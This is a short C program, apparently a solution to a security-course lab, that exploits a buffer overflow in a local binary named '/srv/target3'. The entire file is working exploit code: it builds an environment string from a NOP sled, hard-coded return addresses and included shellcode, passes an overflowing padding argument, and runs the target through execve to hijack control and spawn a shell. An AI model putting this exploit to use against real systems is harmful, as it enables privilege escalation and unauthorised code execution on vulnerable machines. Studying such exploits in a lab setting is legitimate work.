#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

const char* TARGET = "/srv/target3";
const int ENVSIZE = 400;
const uint32_t BASEADDR = 0xffffdec0;
const int NOPSIZE = 201;
const char NOP = 0x90;
const int RETOFFSET = 4;

const uint32_t StartAddr = BASEADDR + RETOFFSET;
const uint32_t SecondAddr = BASEADDR + 2 * RETOFFSET;
const char Pad[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";

void prepEnv(char *env) {
    memset(env, NOP, ENVSIZE - 1);
    *((uint32_t *)(env)) = StartAddr;
    *((uint32_t *)(env + RETOFFSET)) = SecondAddr;
    memcpy(env + NOPSIZE, shellcode, sizeof(shellcode));
    env[ENVSIZE - 1] = '\0';
}

int main(void) {
    char *args[] = {TARGET, Pad, NULL};
    static char env[ENVSIZE];

    prepEnv(env);

    char *envp[] = {env};

    execve(TARGET, args, envp);
    fprintf(stderr, "execve failed.\n");

    return 0;
}